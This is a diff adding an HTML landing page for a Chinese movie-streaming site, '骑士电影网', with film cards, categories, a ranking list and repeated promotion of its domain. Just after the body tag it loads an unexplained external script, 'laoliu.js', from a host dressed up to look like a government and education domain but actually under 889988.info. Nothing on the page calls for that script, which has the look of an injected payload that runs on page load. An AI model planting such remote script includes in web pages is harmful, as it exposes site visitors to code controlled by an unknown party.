@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>骑士电影网 - 高清影视在线观看</title>
+    <meta name="description" content="骑士电影网(qishidianyingwang-h5.com)提供最新高清电影、电视剧、动漫在线观看。极速播放，海量资源，尽在骑士电影网。">
+    <meta name="keywords" content="骑士电影网, qishidianyingwang-h5.com, 高清电影, 在线观看, 最新电影, 影视网站">
+    <meta name="author" content="骑士电影网">
+    <meta name="robots" content="index, follow">
+    <meta name="msvalidate.01" content="YOUR_BING_VERIFICATION_CODE" />
+    <style>
+        :root {
+            --bg: #1a1a1a;
+            --card-bg: #242424;
+            --primary: #c0392b;
+            --accent: #f1c40f;
+            --text: #e0e0e0;
+            --muted: #999;
+            --border: #333;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', 'Microsoft YaHei', sans-serif;
+            background: var(--bg);
+            background-image: repeating-linear-gradient(45deg, #1a1a1a 0px, #1a1a1a 2px, #1c1c1c 2px, #1c1c1c 4px);
+            color: var(--text);
+            line-height: 1.6;
+            scroll-behavior: smooth;
+        }
+        header {
+            background: rgba(26,26,26,0.97);
+            border-bottom: 2px solid var(--primary);
+            position: fixed; width: 100%; top: 0; z-index: 1000;
+        }
+        .nav-wrap {
+            max-width: 1200px; margin: 0 auto; padding: 0 20px;
+            display: flex; justify-content: space-between; align-items: center; height: 68px;
+        }
+        .logo {
+            font-size: 24px; font-weight: 800; color: var(--accent);
+            text-decoration: none; letter-spacing: 1px;
+        }
+        nav ul { display: flex; list-style: none; }
+        nav ul li { margin-left: 28px; }
+        nav ul li a {
+            color: var(--text); text-decoration: none; font-size: 15px;
+            transition: color .3s; font-weight: 500;
+        }
+        nav ul li a:hover { color: var(--accent); }
+        .menu-toggle { display: none; flex-direction: column; cursor: pointer; }
+        .menu-toggle span { height: 2px; width: 24px; background: var(--text); margin-bottom: 5px; }
+        .hero {
+            margin-top: 68px; min-height: 55vh; display: flex; align-items: center; justify-content: center;
+            text-align: center; padding: 40px 20px;
+            background: radial-gradient(ellipse at center, rgba(192,57,43,0.2) 0%, transparent 70%);
+        }
+        .hero h1 {
+            font-size: 3rem; color: #fff; margin-bottom: 18px;
+            font-family: 'Cinzel', 'Trajan Pro', serif; letter-spacing: 2px;
+        }
+        .hero p { color: var(--muted); max-width: 600px; margin: 0 auto 28px; font-size: 1.1rem; }
+        .domain-box {
+            display: inline-block; padding: 12px 28px;
+            border: 1px dashed var(--accent); border-radius: 6px;
+            color: var(--accent); font-family: monospace; font-size: 1.1rem;
+            background: rgba(241,196,15,0.05);
+        }
+        section { padding: 70px 20px; max-width: 1200px; margin: 0 auto; }
+        .section-title {
+            text-align: center; font-size: 1.9rem; margin-bottom: 46px; color: #fff;
+            font-family: 'Cinzel', 'Trajan Pro', serif; letter-spacing: 2px;
+        }
+        .section-title::before, .section-title::after {
+            content: '—'; color: var(--primary); margin: 0 12px;
+        }
+        .grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(190px, 1fr)); gap: 24px;
+        }
+        .card {
+            background: var(--card-bg); border: 1px solid var(--border); border-radius: 6px;
+            overflow: hidden; text-decoration: none; transition: transform .3s, border-color .3s;
+            display: block;
+        }
+        .card:hover { transform: translateY(-6px); border-color: var(--primary); }
+        .card-img {
+            height: 260px; background: #2a2a2a; display: flex; align-items: center; justify-content: center;
+            font-size: 2.5rem; position: relative;
+        }
+        .hd-badge {
+            position: absolute; top: 8px; right: 8px; background: var(--primary);
+            color: #fff; font-size: 11px; padding: 2px 6px; border-radius: 3px; font-weight: bold;
+        }
+        .card-body { padding: 14px; }
+        .card-title { color: #fff; font-size: 1rem; margin-bottom: 4px; }
+        .card-info { color: var(--muted); font-size: .85rem; }
+        .categories { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; margin-bottom: 36px; }
+        .cat-tag {
+            padding: 8px 18px; background: var(--card-bg); border: 1px solid var(--border);
+            border-left: 3px solid var(--primary); border-radius: 4px; color: var(--text);
+            text-decoration: none; transition: all .3s; font-size: .9rem;
+        }
+        .cat-tag:hover { background: var(--primary); color: #fff; border-color: var(--primary); }
+        .ranking { list-style: none; max-width: 780px; margin: 0 auto; }
+        .ranking li {
+            display: flex; align-items: center; padding: 14px 18px; background: var(--card-bg);
+            border: 1px solid var(--border); border-radius: 4px; margin-bottom: 10px;
+            text-decoration: none; transition: background .3s;
+        }
+        .ranking li:hover { background: rgba(192,57,43,0.12); }
+        .rank-num {
+            font-size: 1.5rem; font-weight: bold; width: 42px; text-align: center;
+            font-family: 'Cinzel', serif;
+        }
+        .rank-1 { color: #f1c40f; }
+        .rank-2 { color: #c0c0c0; }
+        .rank-3 { color: #cd7f32; }
+        .rank-other { color: var(--primary); }
+        .rank-body { margin-left: 14px; }
+        .rank-title { color: #fff; font-size: 1.05rem; }
+        .rank-meta { color: var(--muted); font-size: .85rem; margin-top: 3px; }
+        .about-text { max-width: 780px; margin: 0 auto; text-align: center; color: var(--muted); }
+        .about-text strong { color: var(--accent); }
+        .advantages { text-align: left; max-width: 520px; margin: 24px auto 0; list-style: none; }
+        .advantages li { padding: 8px 0; color: var(--text); }
+        .advantages li::before { content: '✓'; color: var(--primary); font-weight: bold; margin-right: 10px; }
+        footer { background: var(--card-bg); border-top: 1px solid var(--border); padding: 36px 20px; text-align: center; }
+        footer p { color: var(--muted); margin-bottom: 8px; font-size: .9rem; }
+        footer a { color: var(--accent); text-decoration: none; }
+        .notice {
+            background: var(--card-bg); border: 1px solid var(--accent); border-radius: 4px;
+            max-width: 1200px; margin: 80px auto 0; padding: 12px 20px; text-align: center;
+            color: var(--accent); font-size: .9rem;
+        }
+        @media (max-width: 768px) {
+            .menu-toggle { display: flex; }
+            nav ul {
+                position: absolute; top: 68px; left: 0; width: 100%; background: #222;
+                flex-direction: column; align-items: center; max-height: 0; overflow: hidden;
+                transition: max-height .3s; border-bottom: 1px solid var(--border);
+            }
+            nav ul.active { max-height: 320px; padding: 16px 0; }
+            nav ul li { margin: 12px 0; }
+            .hero h1 { font-size: 2rem; }
+            section { padding: 56px 16px; }
+            .grid { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 14px; }
+            .card-img { height: 200px; }
+        }
+    </style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+    <header>
+        <div class="nav-wrap">
+            <a href="#" class="logo">⚔ 骑士电影网</a>
+            <div class="menu-toggle" onclick="toggleMenu()"><span></span><span></span><span></span></div>
+            <nav>
+                <ul id="nav-menu">
+                    <li><a href="#home">首页</a></li>
+                    <li><a href="#latest">最新热映</a></li>
+                    <li><a href="#categories">影片分类</a></li>
+                    <li><a href="#ranking">排行榜</a></li>
+                    <li><a href="#about">关于我们</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <section id="home" class="hero">
+        <div>
+            <h1>骑士电影网</h1>
+            <p>汇聚全球高清影视资源，极速流畅的在线观影体验。海量电影、电视剧、动漫一网打尽。</p>
+            <div class="domain-box">🌐 https://qishidianyingwang-h5.com</div>
+        </div>
+    </section>
+
+    <section id="latest">
+        <h2 class="section-title">最新热映</h2>
+        <div class="grid">
+            <a href="#" class="card"><div class="card-img">🎬<span class="hd-badge">HD</span></div><div class="card-body"><div class="card-title">沙丘2</div><div class="card-info">科幻 / 2024</div></div></a>
+            <a href="#" class="card"><div class="card-img">🎬<span class="hd-badge">HD</span></div><div class="card-body"><div class="card-title">奥本海默</div><div class="card-info">传记 / 2023</div></div></a>
+            <a href="#" class="card"><div class="card-img">🎬<span class="hd-badge">HD</span></div><div class="card-body"><div class="card-title">哥斯拉大战金刚2</div><div class="card-info">动作 / 2024</div></div></a>
+            <a href="#" class="card"><div class="card-img">🎬<span class="hd-badge">HD</span></div><div class="card-body"><div class="card-title">功夫熊猫4</div><div class="card-info">动画 / 2024</div></div></a>
+            <a href="#" class="card"><div class="card-img">🎬<span class="hd-badge">HD</span></div><div class="card-body"><div class="card-title">坠落的审判</div><div class="card-info">悬疑 / 2023</div></div></a>
+            <a href="#" class="card"><div class="card-img">🎬<span class="hd-badge">HD</span></div><div class="card-body"><div class="card-title">美国小说</div><div class="card-info">喜剧 / 2023</div></div></a>
+        </div>
+    </section>
+
+    <section id="categories">
+        <h2 class="section-title">影片分类</h2>
+        <div class="categories">
+            <a href="#" class="cat-tag">动作片</a>
+            <a href="#" class="cat-tag">喜剧片</a>
+            <a href="#" class="cat-tag">爱情片</a>
+            <a href="#" class="cat-tag">科幻片</a>
+            <a href="#" class="cat-tag">恐怖片</a>
+            <a href="#" class="cat-tag">动画片</a>
+            <a href="#" class="cat-tag">悬疑片</a>
+            <a href="#" class="cat-tag">战争片</a>
+            <a href="#" class="cat-tag">纪录片</a>
+            <a href="#" class="cat-tag">电视剧</a>
+            <a href="#" class="cat-tag">综艺</a>
+            <a href="#" class="cat-tag">动漫</a>
+        </div>
+        <div class="grid">
+            <a href="#" class="card"><div class="card-img">🥋</div><div class="card-body"><div class="card-title">谍影重重</div><div class="card-info">动作 / 8.5分</div></div></a>
+            <a href="#" class="card"><div class="card-img">😂</div><div class="card-body"><div class="card-title">楚门的世界</div><div class="card-info">喜剧 / 9.0分</div></div></a>
+            <a href="#" class="card"><div class="card-img">👽</div><div class="card-body"><div class="card-title">星际穿越</div><div class="card-info">科幻 / 9.2分</div></div></a>
+            <a href="#" class="card"><div class="card-img">💖</div><div class="card-body"><div class="card-title">泰坦尼克号</div><div class="card-info">爱情 / 9.1分</div></div></a>
+        </div>
+    </section>
+
+    <section id="ranking">
+        <h2 class="section-title">热门排行榜</h2>
+        <ul class="ranking">
+            <li><a href="#"><div class="rank-num rank-1">1</div><div class="rank-body"><div class="rank-title">肖申克的救赎</div><div class="rank-meta">剧情 / 9.7分 · 骑士电影网推荐</div></div></a></li>
+            <li><a href="#"><div class="rank-num rank-2">2</div><div class="rank-body"><div class="rank-title">阿甘正传</div><div class="rank-meta">剧情 / 9.5分 · 骑士电影网推荐</div></div></a></li>
+            <li><a href="#"><div class="rank-num rank-3">3</div><div class="rank-body"><div class="rank-title">盗梦空间</div><div class="rank-meta">科幻 / 9.3分 · 骑士电影网推荐</div></div></a></li>
+            <li><a href="#"><div class="rank-num rank-other">4</div><div class="rank-body"><div class="rank-title">泰坦尼克号</div><div class="rank-meta">爱情 / 9.1分 · 骑士电影网推荐</div></div></a></li>
+            <li><a href="#"><div class="rank-num rank-other">5</div><div class="rank-body"><div class="rank-title">这个杀手不太冷</div><div class="rank-meta">动作 / 9.4分 · 骑士电影网推荐</div></div></a></li>
+            <li><a href="#"><div class="rank-num rank-other">6</div><div class="rank-body"><div class="rank-title">星际穿越</div><div class="rank-meta">科幻 / 9.2分 · 骑士电影网推荐</div></div></a></li>
+        </ul>
+    </section>
+
+    <section id="about">
+        <h2 class="section-title">关于 骑士电影网</h2>
+        <div class="about-text">
+            <p>欢迎访问 <strong>骑士电影网</strong>（网址：<strong>https://qishidianyingwang-h5.com</strong>）。</p>
+            <p style="margin-top:18px;">致力于打造纯净高效的影视资源聚合平台，院线大片与经典老片应有尽有。采用先进 H5 技术，完美适配移动端与桌面端，随时随地畅享观影。</p>
+            <ul class="advantages">
+                <li>海量正版影视资源，每日更新</li>
+                <li>极速加载，流畅不卡顿</li>
+                <li>全端自适应，手机电脑都能看</li>
+                <li>界面清爽，无烦人弹窗广告</li>
+            </ul>
+        </div>
+    </section>
+
+    <div class="notice">🛡️ 骑士电影网 · 守护您的每一次观影体验 · 官方网站：https://qishidianyingwang-h5.com</div>
+
+    <footer>
+        <p>© 2024 骑士电影网. All rights reserved.</p>
+        <p>访问官网：<a href="https://qishidianyingwang-h5.com">https://qishidianyingwang-h5.com</a></p>
+        <p>本站为演示页面，内容仅供测试使用。</p>
+    </footer>
+
+    <script>
+        function toggleMenu() { document.getElementById('nav-menu').classList.toggle('active'); }
+        document.querySelectorAll('nav ul li a').forEach(function(a){
+            a.addEventListener('click', function(){ document.getElementById('nav-menu').classList.remove('active'); });
+        });
+    </script>
+</body>
+</html>
